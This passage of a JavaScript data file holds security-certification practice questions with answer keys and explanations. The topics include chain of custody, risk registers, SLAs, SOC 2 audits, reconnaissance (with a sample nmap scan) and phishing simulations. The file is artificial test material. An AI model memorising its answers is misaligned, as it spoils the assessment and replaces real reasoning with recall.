      stem: 'During a ransomware incident, nobody knew who could authorize taking the payment system offline, and the communications team first learned of the incident from a journalist. Which activity would BEST have prevented these problems?',
      options: [
        ['Regular tabletop exercises with executives, legal and communications to rehearse roles and escalation', 'Reveals authority and communication gaps before a real incident.'],
        ['An external vulnerability scan', 'Finds technical weaknesses, not process gaps.'],
        ['Buying a next-generation firewall', 'Unrelated to roles and communication.'],
        ['Threat hunting', 'Looks for attackers, not process gaps.'],
      ],
      answer: [0],
      explain: 'Tabletops test decisions, authority and communication; simulations test technical response.',
      clues: ['nobody knew who could authorize'],
    },
  ],
  'digital-forensics': [
    {
      id: '4.8-15', level: 2,
      stem: 'What is the MOST significant problem with this chain-of-custody record?',
      exhibit: 'Item E-17: Laptop SN 5CG92 (subject: R. Vance)\n03-04 09:10  Collected by: T. Ahmed (IR)        Location: Office 3.12\n03-04 09:45  Received by: (no entry)\n03-05 14:20  Imaged by: L. Chen (Forensics)     SHA-256 recorded',
      options: [
        ['There is an undocumented gap — no record of who held the laptop between collection and imaging', 'A break in custody undermines admissibility.'],
        ['The laptop was imaged', 'Imaging is correct practice.'],
        ['A SHA-256 hash was recorded', 'Hashing proves integrity.'],
        ['The serial number is listed', 'Identifying the item is required.'],
      ],
      answer: [0],
      explain: 'Every transfer needs who, when, where and why. A missing hand-off lets the defense argue the evidence could have been altered.',
      clues: ['Received by: (no entry)'],
    },
  ],
  /* ---------- 4.9 ---------- */
  'log-data-sources': [
    {
      id: '4.9-10', level: 3,
      stem: 'An IPS running in detection-only mode logged an exploit attempt against a public web server. To determine whether the attack succeeded, which data should the analyst examine FIRST?',
      options: [
        ['The web server’s application logs for the matching requests and their response codes', 'Shows whether requests reached the app and how it responded.'],
        ['The IPS vendor’s signature documentation', 'Explains the signature, not the outcome.'],
        ['The acceptable use policy', 'Unrelated.'],
        ['DHCP lease records', 'Map internal IPs to devices, not web outcomes.'],
      ],
      answer: [0],
      explain: 'Pivot from the alert to the target’s own logs (then endpoint telemetry and flows) to confirm impact.',
      clues: ['detection-only mode'],
    },
  ],
  'investigation-data-sources': [
    {
      id: '4.9-11', level: 2,
      stem: 'Which TWO data sources would BEST help confirm whether an IDS alert for an Apache exploit is a true positive? (Choose two.)',
      options: [
        ['Recent vulnerability scan results for the target server', 'Shows whether the server is actually vulnerable.'],
        ['A packet capture of the alerted session', 'Shows what was actually sent and returned.'],
        ['The company organization chart', 'Unrelated.'],
        ['The ISP’s service-level agreement', 'Unrelated.'],
        ['Badge access logs', 'Physical access, not web traffic.'],
      ],
      answer: [0, 1],
      explain: 'Context (is it vulnerable?) plus content (what happened?) separates true positives from noise.',
    },
  ],
  /* ---------- 5.1 ---------- */
  'governance-structures': [
    {
      id: '5.1-15', level: 3,
      stem: 'A global company found that each regional office used a different incident response process, and nobody could coordinate during a cross-border incident. Leadership wants consistent security decisions without losing local legal expertise. Which structure is MOST appropriate?',
      options: [
        ['A hybrid model: central policies and standards from a group security committee, implemented by regional teams', 'Consistency with local adaptation.'],
        ['Fully decentralized governance', 'Caused the problem.'],
        ['No formal governance — rely on vendors', 'No accountability.'],
        ['Let each employee decide how to respond', 'Chaos.'],
      ],
      answer: [0],
      explain: 'Centralized governance gives consistency; decentralization gives local fit. A hybrid often balances both.',
      clues: ['consistent security decisions without losing local'],
    },
  ],
  'standards-procedures-guidelines': [
    {
      id: '5.1-16', level: 2,
      stem: 'What type of governance document is DOC-SEC-014?',
      exhibit: 'DOC-SEC-014 v3.2\n"Passwords for privileged accounts must be at least 20 characters, stored only in the corporate\nPAM vault, and rotated after every use. Exceptions require CISO approval."',
      options: [
        ['A standard', 'Mandatory, specific, measurable requirements.'],
        ['A guideline', 'Guidelines are optional recommendations.'],
        ['A memorandum of understanding', 'An agreement between parties.'],
        ['A playbook', 'Step-by-step incident response.'],
      ],
      answer: [0],
      explain: '“Must” plus specific values = a standard (here, a password standard supporting the security policy).',
      clues: ['must be at least 20 characters'],
    },
  ],
  'data-roles': [
    {
      id: '5.1-17', level: 2,
      stem: 'Under privacy law, which TWO statements about controllers and processors are correct? (Choose two.)',
      options: [
        ['The controller determines the purposes and means of processing', 'Core definition of a controller.'],
        ['The processor processes personal data on the controller’s behalf', 'Core definition of a processor.'],
        ['Outsourcing to a processor transfers all accountability away from the controller', 'The controller remains accountable.'],
        ['The processor is the person the data is about', 'That is the data subject.'],
        ['Data custodians decide the purposes of processing', 'Custodians implement controls.'],
      ],
      answer: [0, 1],
      explain: 'Controller decides; processor acts on instructions under a data processing agreement; accountability stays with the controller.',
    },
  ],
  /* ---------- 5.2 ---------- */
  'risk-register-appetite': [
    {
      id: '5.2-17', level: 2,
      stem: 'Which issue in this risk register entry should be addressed FIRST?',
      exhibit: 'RSK-031  Ransomware via remote access     Owner: (unassigned)\nInherent: High   Treatment: Mitigate (MFA rollout 60% complete)   Residual: High\nKRI: % remote users without MFA = 40%   Threshold: 5%   Last review: 14 months ago',
      options: [
        ['Assign an accountable risk owner — the KRI is far above its threshold and nobody owns the response', 'Without an owner, nothing drives treatment.'],
        ['Change the risk ID format', 'Cosmetic.'],
        ['Lower the inherent rating to Medium', 'Ratings shouldn’t be changed to make the problem look smaller.'],
        ['Remove the KRI', 'Removes the warning signal.'],
      ],
      answer: [0],
      explain: 'Every risk needs an owner, current review and action when KRIs breach thresholds.',
      clues: ['Owner: (unassigned)', 'Threshold: 5%'],
    },
  ],
  'risk-strategies': [
    {
      id: '5.2-18', level: 1,
      stem: 'Which TWO are examples of risk transference? (Choose two.)',
      options: [
        ['Purchasing cyber insurance', 'Shifts financial impact to the insurer.'],
        ['Outsourcing payment processing with contractual liability for breaches', 'Shifts consequences by contract.'],
        ['Implementing MFA', 'Mitigation.'],
        ['Discontinuing a risky product', 'Avoidance.'],
        ['Formally signing off a low risk', 'Acceptance.'],
      ],
      answer: [0, 1],
      explain: 'Transference shifts financial impact; the organization still remains accountable.',
    },
  ],
  /* ---------- 5.3 ---------- */
  'agreement-types': [
    {
      id: '5.3-12', level: 1,
      stem: 'In which type of agreement would this clause MOST likely appear?',
      exhibit: 'Clause 7.2: "Provider shall maintain 99.9% monthly availability for the Service. If availability\nfalls below this level, Customer is entitled to a service credit of 10% of the monthly fee for each\n0.1% below target."',
      options: [
        ['Service-level agreement (SLA)', 'Measurable service targets with remedies.'],
        ['Non-disclosure agreement (NDA)', 'Confidentiality.'],
        ['Memorandum of understanding (MOU)', 'Non-binding intent.'],
        ['Business partners agreement (BPA)', 'Partnership terms.'],
      ],
      answer: [0],
      explain: 'Availability targets and service credits are classic SLA content.',
      clues: ['99.9% monthly availability', 'service credit'],
    },
  ],
  'vendor-assessment-selection': [
    {
      id: '5.3-13', level: 2,
      stem: 'Which TWO provide independent or verifiable assurance about a vendor’s security controls? (Choose two.)',
      options: [
        ['A SOC 2 Type II report from an independent auditor', 'Third-party assessment over time.'],
        ['Exercising a right-to-audit clause', 'Lets the customer verify directly.'],
        ['The vendor’s marketing brochure', 'Self-promotion.'],
        ['A sales representative’s verbal assurance', 'Not evidence.'],
        ['The vendor’s logo on a security conference banner', 'Not evidence.'],
      ],
      answer: [0, 1],
      explain: 'Prefer independent assessments and contractual audit rights over self-attestation.',
    },
  ],
  /* ---------- 5.4 ---------- */
  'compliance-monitoring': [
    {
      id: '5.4-12', level: 2,
      stem: 'Which conclusion BEST reflects this automated compliance dashboard?',
      exhibit: 'Control                      Target   Today   Trend\nLaptop disk encryption        100%     97%    ↓ (12 devices drifted)\nAnnual AUP acknowledgement    100%     88%    →\nPrivileged MFA                100%    100%    ✓',
      options: [
        ['Encryption drift on 12 devices and missing AUP acknowledgements need remediation before the audit', 'Both gaps are visible and actionable.'],
        ['Everything is compliant', 'Two controls are below target.'],
        ['Privileged MFA is failing', 'It is at 100%.'],
        ['The dashboard removes the need for external audits', 'Monitoring complements audits.'],
      ],
      answer: [0],
      explain: 'Automation catches drift between audits; acknowledgements are evidence that staff accepted policies.',
      clues: ['12 devices drifted', '88%'],
    },
  ],
  'compliance-reporting-consequences': [
    {
      id: '5.4-13', level: 1,
      stem: 'A company suffers a breach after ignoring PCI DSS requirements. Which TWO are likely consequences of the non-compliance? (Choose two.)',
      options: [
        ['Fines imposed through the card brands or acquiring bank', 'Monetary penalties.'],
        ['Losing the ability to process card payments', 'Loss of license/privileges.'],
        ['Automatic ISO 27001 certification', 'Nonsense.'],
        ['A lower cyber insurance premium', 'Premiums usually rise.'],
        ['Exemption from future audits', 'Scrutiny increases.'],
      ],
      answer: [0, 1],
      explain: 'Consequences: fines, sanctions, reputational damage, loss of license and contractual impacts.',
    },
  ],
  /* ---------- 5.5 ---------- */
  'audits-attestation': [
    {
      id: '5.5-10', level: 3,
      stem: 'A regulator requires a bank to prove, through an objective party, that its online-banking controls operated effectively throughout the past year. Which option BEST satisfies this?',
      options: [
        ['An independent third-party audit producing an attestation report that covers the full period', 'Objective and covers operating effectiveness over time (e.g. SOC 2 Type II).'],
        ['An internal self-assessment checklist', 'Not independent.'],
        ['A single vulnerability scan', 'Point-in-time and not an audit of controls.'],
        ['A tabletop exercise', 'Tests plans, not control effectiveness.'],
      ],
      answer: [0],
      explain: 'Independence plus period coverage → third-party audit with attestation (Type II rather than Type I).',
      clues: ['objective party', 'throughout the past year'],
    },
  ],
  'penetration-testing': [
    {
      id: '5.5-11', level: 2,
      stem: 'Which activity in these tester notes is ACTIVE reconnaissance?',
      exhibit: 'Day 1 09:00  WHOIS + certificate transparency logs → 14 subdomains\nDay 1 11:30  Professional networking sites → 230 employees, email format first.last@\nDay 2 08:00  nmap -sS -p- 203.0.113.0/27 → 3389/tcp open on 203.0.113.18',
      options: [
        ['The nmap SYN scan on Day 2', 'Directly probes the target’s systems.'],
        ['The WHOIS lookup', 'Public registry data — passive.'],
        ['Searching certificate transparency logs', 'Public third-party data — passive.'],
        ['Reviewing employee profiles online', 'OSINT — passive.'],
      ],
      answer: [0],
      explain: 'Passive reconnaissance never touches the target; active reconnaissance (scans, banner grabs) does and can be detected.',
      clues: ['nmap -sS'],
    },
  ],
  /* ---------- 5.6 ---------- */
  'user-training-topics': [
    {
      id: '5.6-13', level: 3,
      stem: 'A finance clerk receives a call from someone claiming to be the traveling CFO, demanding an urgent wire transfer before a deal closes and asking the clerk to keep it confidential. What should the clerk do?',
      options: [
        ['Verify through a separate, known channel (for example the CFO’s number on file) and follow the payment approval procedure', 'Out-of-band verification and process defeat BEC-style pressure.'],
        ['Transfer the money immediately to avoid upsetting the CFO', 'Exactly what the attacker wants.'],
        ['Ask the caller to confirm by email', 'The attacker may control or spoof email too.'],
        ['Hang up and tell nobody', 'The attempt should be reported.'],
      ],
      answer: [0],
      explain: 'Urgency, authority and secrecy are social-engineering red flags. Training should make verification and reporting automatic.',
      clues: ['keep it confidential'],
    },
  ],
  'phishing-awareness': [
    {
      id: '5.6-14', level: 2,
      stem: 'Based on this phishing simulation report, which improvement would MOST reduce real-world impact?',
      exhibit: 'Campaign Q2 "Invoice overdue"   Recipients: 1,200\nOpened: 61%   Clicked: 18%   Entered credentials: 7%   Reported: 9%\nMedian time to first report: 47 min',
      options: [
        ['Raise the report rate and shorten the time to first report', 'Early reports let the SOC purge messages before more people click.'],
        ['Get the open rate to zero', 'Opening is not the main risk and zero is unrealistic.'],
        ['Send the campaign to fewer people', 'Hides the problem.'],
        ['Stop measuring clicks', 'Removes useful data.'],
      ],
      answer: [0],
      explain: 'Reporting is the positive behavior that turns one alert user into protection for everyone.',
      clues: ['Reported: 9%', 'Median time to first report'],
    },
  ],
};
